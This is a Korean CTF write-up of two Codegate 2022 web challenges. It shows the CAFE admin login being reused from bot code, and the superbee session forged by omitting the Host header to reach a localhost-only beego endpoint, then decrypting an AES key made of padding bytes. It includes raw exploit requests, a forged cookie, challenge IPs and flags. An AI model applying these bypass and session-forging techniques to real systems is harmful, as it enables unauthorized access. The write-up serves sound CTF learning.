# 2022 Codegate

## WEB

### CAFE

> [http://3.39.55.38:1929](http://3.39.55.38:1929)
>
> You can enjoy this cafe :)
>
> upload text, youtube, ...

```python
#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import sys

options = webdriver.ChromeOptions()

options.add_argument('--headless')
options.add_argument('--disable-logging')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--no-sandbox')
#options.add_argument("user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")

driver = webdriver.Chrome(ChromeDriverManager().install(),options=options)
driver.implicitly_wait(3)

driver.get('http://3.39.55.38:1929/login')
driver.find_element_by_id('id').send_keys('admin')
driver.find_element_by_id('pw').send_keys('$MiLEYEN4')
driver.find_element_by_id('submit').click()
time.sleep(2)

driver.get('http://3.39.55.38:1929/read?no=' + str(sys.argv[1]))
time.sleep(2)

driver.quit()
  
```

제공된 파일을 열어보면 다양한 코드가 존재한다. 게시글을 확인하는 bot 코드가 존재했기 때문에, 출제자가 CSRF 형태의 공격을 의도했다고 생각했다. 그런데 내가 잘못 본건가 싶은 코드가 있었다.

![제공된 bot.py의 로그인 코드](<../../.gitbook/assets/image (6).png>)

id와 pw가 그대로 노출되어있었다. 위 정보로 로그인을 시도하면 정상적으로 로그인이 되고, 첫 번째 게시물에서 다음과 같이 플래그를 획득할 수 있었다.

![flag를 획득한 모습](<../../.gitbook/assets/image (10).png>)

#### FLAG

`codegate2022{4074a143396395e7196bbfd60da0d3a7739139b66543871611c4d5eb397884a9}`

### superbee

> [http://3.39.49.174:30001/](http://3.39.49.174:30001)

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"bytes"
	"github.com/beego/beego/v2/server/web"
)

type BaseController struct {
	web.Controller
	controllerName string
	actionName string
}

type MainController struct {
	BaseController
}

type LoginController struct {
	BaseController
}

type AdminController struct {
	BaseController
}

var admin_id string
var admin_pw string
var app_name string
var auth_key string
var auth_crypt_key string
var flag string

func AesEncrypt(origData, key []byte) ([]byte, error) {
	padded_key := Padding(key, 16)
	block, err := aes.NewCipher(padded_key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	origData = Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}

func Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func Md5(s string) string {
	h := md5.New()
	h.Write([]byte(s))
	return hex.EncodeToString(h.Sum(nil))
}

func (this *BaseController) Prepare() {
	controllerName, _ := this.GetControllerAndAction()
	session := this.Ctx.GetCookie(Md5("sess"))

	if controllerName == "MainController" {
		if session == "" || session != Md5(admin_id + auth_key) {
			this.Redirect("/login/login", 403)
			return
		}
	} else if controllerName == "LoginController" {
		if session != "" {
			this.Ctx.SetCookie(Md5("sess"), "")
		}
	} else if controllerName == "AdminController" {
		domain := this.Ctx.Input.Domain()

		if domain != "localhost" {
			this.Abort("Not Local")
			return
		}
	}
}

func (this *MainController) Index() {
	this.TplName = "index.html"
	this.Data["app_name"] = app_name
	this.Data["flag"] = flag
	this.Render()
}

func (this *LoginController) Login() {
	this.TplName = "login.html"
	this.Data["app_name"] = app_name
	this.Render()
}

func (this *LoginController) Auth() {
	id := this.GetString("id")
	password := this.GetString("password")

	if id == admin_id && password == admin_pw {
		this.Ctx.SetCookie(Md5("sess"), Md5(admin_id + auth_key), 300)

		this.Ctx.WriteString("<script>alert('Login Success');location.href='/main/index';</script>")
		return
	}
	this.Ctx.WriteString("<script>alert('Login Fail');location.href='/login/login';</script>")
}

func (this *AdminController) AuthKey() {
	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
}

func main() {
	app_name, _ = web.AppConfig.String("app_name")
	auth_key, _ = web.AppConfig.String("auth_key")
	auth_crypt_key, _ = web.AppConfig.String("auth_crypt_key")
	admin_id, _ = web.AppConfig.String("id")
	admin_pw, _ = web.AppConfig.String("password")
	flag, _ = web.AppConfig.String("flag")

	web.AutoRouter(&MainController{})
	web.AutoRouter(&LoginController{})
	web.AutoRouter(&AdminController{})
	web.Run()
}
```

Go 언어로 이루어진 웹서비스다. `BaseController`를 기반으로 하는 컨트롤러가 크게 3개가 존재한다. 접근만 하면 flag를 출력하는 `MainController`, Admin으로만 로그인할 수 있는 `LoginController`, localhost로 접근하면 암호화된 auth\_key를 출력하는 `AdminController`가 그것이다.

여기서 주목할 부분은 `conf/app.conf` 내에 정의되어있지 않은 `auth_crypt_key` 설정값을 `main()` function 내에서 가져온다는 것이다.

```go
app_name = superbee
auth_key = [----------REDEACTED------------]
id = admin
password = [----------REDEACTED------------]
flag = [----------REDEACTED------------]
```

이는 다음과 같은 형태로 암호화가 진행됨을 뜻한다.

$$
E(auth\_key,  Padding(null))
$$

admin\_id는 `admin`임을 config 파일을 통해 알 수 있다. AES는 대칭키 암호체계이기 때문에, 패딩 이전의 key가 null임을 이용하여 auth\_key를 구해낼 수 있다.

문제 풀이 흐름은 다음과 같다.

1. localhost로 `/admin/authkey`에 접근하여 암호문 획득
2. 이를 `Padding(null)` 값으로 복호화하여 `auth_key` 획득
3. 헤더에 `Cookie: md5("sess") : md5("admin" + auth_key)` 추가
4. `/main/index`로 접근하여 flag 획득

localhost로 접근하기 위해 XFF와 같이 요청지를 속일 수 있는 헤더 위주로 공격을 시도했으나 먹히지 않았다. 문제의 웹 서버는 beego 프레임워크를 사용하는데, 아래 코드를 통해 `Host()`가 localhost를 반환하는 조건을 확인할 수 있다.

{% embed url="https://github.com/beego/beego/blob/b3e78c97d7e4eb076d8dc05724e3fee2f73c9b34/server/web/context/input.go#L121" %}
Host() return 'localhost' logic
{% endembed %}

즉, Host 헤더가 없으면 localhost를 반환한다. 실제로 Host를 빼고 요청해서 암호문을 획득할 수 있었다.

```http
GET /admin/authkey HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,und;q=0.6

-----------------------------------------

HTTP/1.1 200 OK
Date: Sat, 26 Feb 2022 23:06:53 GMT
Content-Length: 96
Content-Type: text/plain; charset=utf-8

00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607
```

이후 AES 복호화는 CyberChef를 이용해서 Padding 결과인 `0x10101010101010101010101010101010`를 Key로 복호화 할 수 있었다.

![AES Decrypt](<../../.gitbook/assets/image (9) (1).png>)

admin 문자열과 연결하여 md5 해싱을 거치면 session값이 만들어진다. 앞서 설명했던대로 Header를 조작한 뒤 메인페이지에 접근하면 flag를 획득할 수 있다.

```http
GET http://3.39.49.174:30001/main/index HTTP/1.1
Host: 3.39.49.174:30001
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,und;q=0.6
Cookie: f5b338d6bca36d47ee04d93d08c57861=e52f118374179d24fa20ebcceb95c2af

--------------------------------------------------

HTTP/1.1 200 OK
Content-Length: 170
Content-Type: text/html; charset=utf-8
Date: Wed, 02 Mar 2022 10:53:40 GMT

<html>
    <head>
        <title>superbee</title>
    </head>
    <body>
        <h3>Index</h3>
        codegate2022{d9adbe86f4ecc93944e77183e1dc6342}
    </body>
</html>


```

#### FLAG

`codegate2022{d9adbe86f4ecc93944e77183e1dc6342}`



